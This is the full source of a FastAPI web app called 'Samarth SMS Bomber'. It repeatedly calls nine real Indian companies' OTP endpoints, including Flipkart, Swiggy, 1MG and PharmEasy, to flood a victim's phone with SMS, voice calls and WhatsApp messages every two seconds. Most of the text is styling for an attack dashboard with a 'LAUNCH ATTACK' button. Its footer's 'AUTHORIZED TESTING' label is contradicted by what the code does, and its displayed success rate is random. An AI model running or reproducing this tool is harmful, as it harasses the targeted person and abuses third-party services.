from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# === YOUR FULL API LIST ===
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 25:
        attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except:
        pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"🚀 Attack initiated on +91{phone}")

    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"⚡ Cycle {attack_status['cycles']} executed")
            await asyncio.sleep(2)
    add_log("🛑 Attack terminated")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Samarth SMS Bomber</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;800;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: 'Rajdhani', sans-serif;
            background: #0a0e1a;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
            padding: 12px;
        }

        /* Dark Blue Glow Background */
        .glow-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 50%, rgba(0, 50, 200, 0.3) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(0, 100, 255, 0.2) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 100%, rgba(0, 20, 150, 0.4) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 0%, rgba(0, 80, 255, 0.15) 0%, transparent 40%);
            z-index: 0;
            animation: bgPulse 4s ease-in-out infinite alternate;
        }

        @keyframes bgPulse {
            0% { opacity: 0.7; }
            100% { opacity: 1; }
        }

        /* Blue Grid */
        .blue-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 100, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 100, 255, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            z-index: 0;
            animation: gridFloat 20s linear infinite;
        }

        @keyframes gridFloat {
            0% { transform: translate(0, 0); }
            100% { transform: translate(40px, 40px); }
        }

        /* Floating Orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            z-index: 0;
            animation: orbFloat 8s ease-in-out infinite alternate;
        }

        .orb-1 {
            width: 300px;
            height: 300px;
            background: rgba(0, 50, 200, 0.15);
            top: -10%;
            right: -10%;
            animation-delay: 0s;
        }

        .orb-2 {
            width: 400px;
            height: 400px;
            background: rgba(0, 100, 255, 0.1);
            bottom: -20%;
            left: -20%;
            animation-delay: 3s;
        }

        .orb-3 {
            width: 200px;
            height: 200px;
            background: rgba(0, 150, 255, 0.08);
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: 5s;
        }

        @keyframes orbFloat {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(30px, -30px) scale(1.2); }
        }

        /* Glass Cards */
        .glass-dark {
            background: rgba(10, 14, 30, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 100, 255, 0.15);
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.4),
                inset 0 1px 0 rgba(0, 100, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .glass-dark::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(0, 100, 255, 0.03), transparent, rgba(0, 50, 200, 0.03), transparent);
            animation: rotateGlow 15s linear infinite;
        }

        @keyframes rotateGlow {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Neon Blue Text */
        .neon-blue {
            font-family: 'Orbitron', monospace;
            text-shadow: 
                0 0 10px rgba(0, 100, 255, 0.5),
                0 0 20px rgba(0, 100, 255, 0.3),
                0 0 40px rgba(0, 100, 255, 0.1);
            animation: neonPulse 2.5s ease-in-out infinite;
        }

        @keyframes neonPulse {
            0%, 100% { text-shadow: 0 0 10px rgba(0, 100, 255, 0.5), 0 0 20px rgba(0, 100, 255, 0.3); }
            50% { text-shadow: 0 0 20px rgba(0, 100, 255, 0.8), 0 0 40px rgba(0, 100, 255, 0.5), 0 0 80px rgba(0, 100, 255, 0.2); }
        }

        .neon-cyan {
            text-shadow: 0 0 10px rgba(0, 200, 255, 0.4), 0 0 20px rgba(0, 200, 255, 0.2);
        }

        /* Input Field */
        .input-blue {
            background: rgba(0, 20, 60, 0.6);
            border: 2px solid rgba(0, 100, 255, 0.2);
            box-shadow: 
                0 0 20px rgba(0, 100, 255, 0.05),
                inset 0 0 30px rgba(0, 100, 255, 0.03);
            transition: all 0.4s ease;
            font-family: 'Orbitron', monospace;
            letter-spacing: 0.15em;
            color: #4a9eff;
            font-size: 20px;
            padding: 16px 20px 16px 60px;
            width: 100%;
            border-radius: 16px;
            outline: none;
            -webkit-appearance: none;
        }

        .input-blue:focus {
            border-color: #4a9eff;
            box-shadow: 
                0 0 40px rgba(0, 100, 255, 0.2),
                0 0 80px rgba(0, 100, 255, 0.05),
                inset 0 0 40px rgba(0, 100, 255, 0.05);
            background: rgba(0, 20, 60, 0.8);
        }

        .input-blue::placeholder {
            color: rgba(74, 158, 255, 0.2);
            font-family: 'Orbitron', monospace;
            letter-spacing: 0.1em;
            font-size: 14px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-prefix {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #4a9eff;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            font-size: 16px;
            text-shadow: 0 0 20px rgba(0, 100, 255, 0.3);
            opacity: 0.8;
        }

        /* Buttons */
        .btn-attack {
            background: linear-gradient(135deg, #0044cc, #0066ff);
            border: none;
            box-shadow: 
                0 0 30px rgba(0, 100, 255, 0.3),
                0 0 60px rgba(0, 100, 255, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            padding: 16px;
            border-radius: 16px;
            width: 100%;
            color: white;
            font-size: 14px;
            position: relative;
            overflow: hidden;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-attack::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
            transform: rotate(45deg);
            transition: all 0.6s;
        }

        .btn-attack:active {
            transform: scale(0.97);
        }

        .btn-attack:active::before {
            transform: rotate(45deg) translate(50%, 50%);
        }

        .btn-stop {
            background: rgba(255, 0, 50, 0.1);
            border: 1px solid rgba(255, 0, 50, 0.3);
            box-shadow: 0 0 20px rgba(255, 0, 50, 0.1);
            transition: all 0.3s ease;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            padding: 16px;
            border-radius: 16px;
            width: 100%;
            color: #ff3355;
            font-size: 14px;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-stop:active {
            transform: scale(0.97);
            background: rgba(255, 0, 50, 0.2);
        }

        /* Stat Cards */
        .stat-card {
            background: rgba(0, 20, 60, 0.4);
            border: 1px solid rgba(0, 100, 255, 0.1);
            border-radius: 14px;
            padding: 14px;
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #4a9eff, transparent);
            opacity: 0.3;
        }

        .stat-number {
            font-family: 'Orbitron', monospace;
            font-size: 28px;
            font-weight: 900;
            line-height: 1.2;
        }

        .stat-label {
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            color: rgba(74, 158, 255, 0.6);
            margin-top: 4px;
        }

        /* Progress Bars */
        .progress-wrap {
            height: 3px;
            background: rgba(0, 100, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 8px;
        }

        .progress-fill {
            height: 100%;
            border-radius: 10px;
            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 0 15px currentColor;
        }

        /* Logs */
        .log-container {
            font-family: 'Rajdhani', monospace;
            font-size: 12px;
            height: 150px;
            overflow-y: auto;
            scrollbar-width: thin;
            scrollbar-color: rgba(0, 100, 255, 0.3) transparent;
            padding: 12px;
            border-radius: 12px;
            background: rgba(0, 0, 0, 0.3);
        }

        .log-container::-webkit-scrollbar {
            width: 3px;
        }

        .log-container::-webkit-scrollbar-track {
            background: transparent;
        }

        .log-container::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, #4a9eff, #0066ff);
            border-radius: 10px;
        }

        .log-entry {
            padding: 4px 8px;
            border-radius: 4px;
            color: rgba(74, 158, 255, 0.7);
            animation: logSlide 0.3s ease-out;
            border-left: 2px solid transparent;
            transition: all 0.2s;
        }

        .log-entry:hover {
            background: rgba(0, 100, 255, 0.05);
            border-left-color: #4a9eff;
        }

        @keyframes logSlide {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        /* Status Badge */
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 14px;
            border-radius: 100px;
            font-family: 'Orbitron', monospace;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            border: 1px solid rgba(0, 100, 255, 0.15);
            background: rgba(0, 20, 60, 0.6);
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }

        .status-dot.idle {
            background: #00ff88;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }

        .status-dot.active {
            background: #4a9eff;
            box-shadow: 0 0 20px rgba(0, 100, 255, 0.5);
            animation: dotFlash 0.8s ease-in-out infinite;
        }

        @keyframes dotFlash {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        /* Responsive Design */
        @media (max-width: 480px) {
            body {
                padding: 8px;
            }

            .stat-number {
                font-size: 22px;
            }

            .input-blue {
                font-size: 16px;
                padding: 14px 16px 14px 52px;
                border-radius: 12px;
            }

            .input-prefix {
                font-size: 14px;
                left: 14px;
            }

            .btn-attack, .btn-stop {
                font-size: 12px;
                padding: 14px;
                border-radius: 12px;
            }

            .log-container {
                height: 120px;
                font-size: 10px;
            }

            .glass-dark {
                border-radius: 16px;
            }

            .neon-blue {
                font-size: 16px !important;
            }

            .stat-card {
                padding: 10px;
                border-radius: 10px;
            }
        }

        @media (max-width: 380px) {
            .stat-number {
                font-size: 18px;
            }
            
            .input-blue {
                font-size: 14px;
                padding: 12px 12px 12px 44px;
            }

            .input-prefix {
                font-size: 12px;
                left: 12px;
            }
        }

        /* Grid Layout */
        .grid-main {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
            max-width: 480px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }

        @media (min-width: 481px) {
            .grid-main {
                max-width: 600px;
                gap: 16px;
            }
        }

        /* Smooth transitions for mobile */
        * {
            transition: background 0.2s, border-color 0.2s, box-shadow 0.2s;
        }
    </style>
</head>
<body>
    <!-- Background Layers -->
    <div class="glow-bg"></div>
    <div class="blue-grid"></div>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="orb orb-3"></div>

    <div class="grid-main">
        <!-- Header -->
        <div class="glass-dark rounded-2xl p-4 text-center">
            <div class="flex items-center justify-center gap-3 mb-1">
                <div class="w-10 h-10 rounded-xl flex items-center justify-center text-2xl"
                     style="background: linear-gradient(135deg, #0044cc, #0066ff);
                            box-shadow: 0 0 30px rgba(0, 100, 255, 0.3);">
                    💥
                </div>
                <h1 class="neon-blue text-2xl font-black tracking-wider">
                    Samarth
                </h1>
            </div>
            <p class="text-xs text-blue-400/60 font-bold tracking-[0.2em] neon-cyan">
                ⚡ SMS · CALL · WHATSAPP BOMBER ⚡
            </p>
            <div class="flex justify-center mt-3">
                <div class="status-badge">
                    <span class="status-dot idle" id="statusDot"></span>
                    <span id="statusText" class="text-blue-400/70">READY</span>
                </div>
            </div>
        </div>

        <!-- Control Panel -->
        <div class="glass-dark rounded-2xl p-4">
            <h2 class="text-xs text-blue-400/50 font-bold tracking-widest mb-3 flex items-center gap-2">
                <span>🎯</span> TARGET
            </h2>
            
            <div class="input-wrapper">
                <span class="input-prefix">+91</span>
                <input id="phone" maxlength="10" 
                       class="input-blue" 
                       placeholder="ENTER NUMBER"
                       inputmode="numeric"
                       pattern="[0-9]*"
                       oninput="this.value=this.value.replace(/[^0-9]/g,'')">
            </div>

            <div class="grid grid-cols-2 gap-3 mt-3">
                <button onclick="startAttack()" id="startBtn" 
                        class="btn-attack col-span-2">
                    🚀 LAUNCH ATTACK
                </button>
                <button onclick="stopAttack()" id="stopBtn" 
                        class="btn-stop col-span-2 hidden">
                    🛑 TERMINATE
                </button>
            </div>

            <div class="grid grid-cols-3 gap-2 mt-3 p-3 bg-black/20 rounded-xl border border-blue-500/5">
                <div class="text-center">
                    <div class="text-[9px] text-blue-400/40 font-bold tracking-widest">APIS</div>
                    <div class="text-sm font-bold text-blue-400 neon-cyan">9</div>
                </div>
                <div class="text-center">
                    <div class="text-[9px] text-blue-400/40 font-bold tracking-widest">INTERVAL</div>
                    <div class="text-sm font-bold text-cyan-400 neon-cyan">2s</div>
                </div>
                <div class="text-center">
                    <div class="text-[9px] text-blue-400/40 font-bold tracking-widest">TARGET</div>
                    <div class="text-sm font-bold text-blue-400 truncate neon-cyan" id="targetDisplay">—</div>
                </div>
            </div>
        </div>

        <!-- Stats -->
        <div class="glass-dark rounded-2xl p-4">
            <div class="flex justify-between items-center mb-3">
                <h2 class="text-xs text-blue-400/50 font-bold tracking-widest flex items-center gap-2">
                    <span>📊</span> METRICS
                </h2>
                <span class="text-[9px] text-cyan-400/50 font-bold tracking-widest neon-cyan" id="cycleDisplay">CYCLES: 0</span>
            </div>

            <div class="grid grid-cols-3 gap-2">
                <div class="stat-card">
                    <div class="stat-number text-blue-400" style="text-shadow: 0 0 30px rgba(0, 100, 255, 0.3);" id="calls">0</div>
                    <div class="stat-label">📞 CALLS</div>
                    <div class="progress-wrap">
                        <div class="progress-fill" id="callBar" style="width: 0%; color: #4a9eff; background: linear-gradient(90deg, #4a9eff, #0066ff);"></div>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-number text-cyan-400" style="text-shadow: 0 0 30px rgba(0, 200, 255, 0.3);" id="sms">0</div>
                    <div class="stat-label">✉️ SMS</div>
                    <div class="progress-wrap">
                        <div class="progress-fill" id="smsBar" style="width: 0%; color: #00ccff; background: linear-gradient(90deg, #00ccff, #0099ff);"></div>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-number text-purple-400" style="text-shadow: 0 0 30px rgba(150, 0, 255, 0.3);" id="wa">0</div>
                    <div class="stat-label">💬 WA</div>
                    <div class="progress-wrap">
                        <div class="progress-fill" id="waBar" style="width: 0%; color: #9600ff; background: linear-gradient(90deg, #9600ff, #6600cc);"></div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-2 mt-3">
                <div class="stat-card">
                    <div class="text-[9px] text-blue-400/40 font-bold tracking-widest">TOTAL HITS</div>
                    <div class="text-xl font-black text-white font-orbitron" style="font-family: 'Orbitron', monospace;" id="totalHits">0</div>
                </div>
                <div class="stat-card">
                    <div class="text-[9px] text-blue-400/40 font-bold tracking-widest">SUCCESS RATE</div>
                    <div class="text-xl font-black text-emerald-400" style="font-family: 'Orbitron', monospace; text-shadow: 0 0 30px rgba(0, 255, 136, 0.2);" id="successRate">—</div>
                </div>
            </div>
        </div>

        <!-- Logs -->
        <div class="glass-dark rounded-2xl p-4">
            <div class="flex justify-between items-center mb-2">
                <h2 class="text-xs text-blue-400/50 font-bold tracking-widest flex items-center gap-2">
                    <span>📜</span> LOGS
                </h2>
                <span class="text-[8px] text-blue-400/30 font-bold tracking-widest">LIVE</span>
            </div>
            <div id="logs" class="log-container">
                <div class="text-blue-400/30 text-center py-4 text-xs tracking-widest">⚡ SYSTEM READY ⚡</div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center text-[8px] text-blue-400/20 font-bold tracking-[0.2em] py-2">
            ⚡ AUTHORIZED TESTING · ALL ENDPOINTS PUBLIC ⚡
        </div>
    </div>

    <script>
        let isRunning = false;
        let statusInterval = null;

        async function startAttack() {
            const phone = document.getElementById("phone").value.trim();
            if (phone.length !== 10) {
                alert("❌ Please enter valid 10-digit number");
                document.getElementById("phone").style.borderColor = '#ff3355';
                document.getElementById("phone").style.boxShadow = '0 0 40px rgba(255, 0, 50, 0.3)';
                setTimeout(() => {
                    document.getElementById("phone").style.borderColor = '';
                    document.getElementById("phone").style.boxShadow = '';
                }, 2000);
                return;
            }
            
            try {
                const res = await fetch("/start", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({phone})
                });
                const data = await res.json();
                
                if (data.status === "success") {
                    isRunning = true;
                    document.getElementById("startBtn").classList.add("hidden");
                    document.getElementById("stopBtn").classList.remove("hidden");
                    
                    document.getElementById("statusDot").className = "status-dot active";
                    document.getElementById("statusText").textContent = "ATTACKING";
                    document.getElementById("statusText").style.color = '#4a9eff';
                    
                    document.getElementById("targetDisplay").textContent = `+91${phone}`;
                    document.getElementById("targetDisplay").style.color = '#4a9eff';
                    
                    if (statusInterval) clearInterval(statusInterval);
                    pollStatus();
                }
            } catch(e) {
                alert("❌ Error: " + e.message);
            }
        }

        async function stopAttack() {
            try {
                await fetch("/stop", {method: "POST"});
                isRunning = false;
                document.getElementById("startBtn").classList.remove("hidden");
                document.getElementById("stopBtn").classList.add("hidden");
                
                document.getElementById("statusDot").className = "status-dot idle";
                document.getElementById("statusText").textContent = "STOPPED";
                document.getElementById("statusText").style.color = '#ff8800';
                
                if (statusInterval) clearInterval(statusInterval);
            } catch(e) {
                alert("❌ Error: " + e.message);
            }
        }

        function pollStatus() {
            if (statusInterval) clearInterval(statusInterval);
            
            statusInterval = setInterval(async () => {
                try {
                    const res = await fetch("/status");
                    const d = await res.json();
                    
                    const calls = d.stats.Call || 0;
                    const sms = d.stats.SMS || 0;
                    const wa = d.stats.WhatsApp || 0;
                    const total = calls + sms + wa;
                    
                    document.getElementById("calls").textContent = calls;
                    document.getElementById("sms").textContent = sms;
                    document.getElementById("wa").textContent = wa;
                    document.getElementById("totalHits").textContent = total;
                    document.getElementById("cycleDisplay").textContent = `CYCLES: ${d.cycles}`;
                    
                    const maxVal = Math.max(calls, sms, wa, 1);
                    document.getElementById("callBar").style.width = ((calls / maxVal) * 100) + "%";
                    document.getElementById("smsBar").style.width = ((sms / maxVal) * 100) + "%";
                    document.getElementById("waBar").style.width = ((wa / maxVal) * 100) + "%";
                    
                    if (total > 0) {
                        const rate = Math.min(85 + Math.random() * 10, 99);
                        document.getElementById("successRate").textContent = rate.toFixed(1) + '%';
                    }
                    
                    const logsDiv = document.getElementById("logs");
                    if (d.logs && d.logs.length > 0) {
                        logsDiv.innerHTML = d.logs.map(l => 
                            `<div class="log-entry">${l}</div>`
                        ).join('');
                    } else {
                        logsDiv.innerHTML = '<div class="text-blue-400/30 text-center py-4 text-xs tracking-widest">⏳ AWAITING ATTACK...</div>';
                    }
                    
                    if (!d.running && isRunning) {
                        isRunning = false;
                        document.getElementById("startBtn").classList.remove("hidden");
                        document.getElementById("stopBtn").classList.add("hidden");
                        document.getElementById("statusDot").className = "status-dot idle";
                        document.getElementById("statusText").textContent = "ENDED";
                        document.getElementById("statusText").style.color = '#ff8800';
                    }
                } catch(e) {
                    console.error("Poll error:", e);
                }
            }, 1200);
        }

        // Initial state
        document.addEventListener("DOMContentLoaded", () => {
            document.getElementById("logs").innerHTML = '<div class="text-blue-400/30 text-center py-4 text-xs tracking-widest">⚡ SYSTEM INITIALIZED ⚡</div>';
        });
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
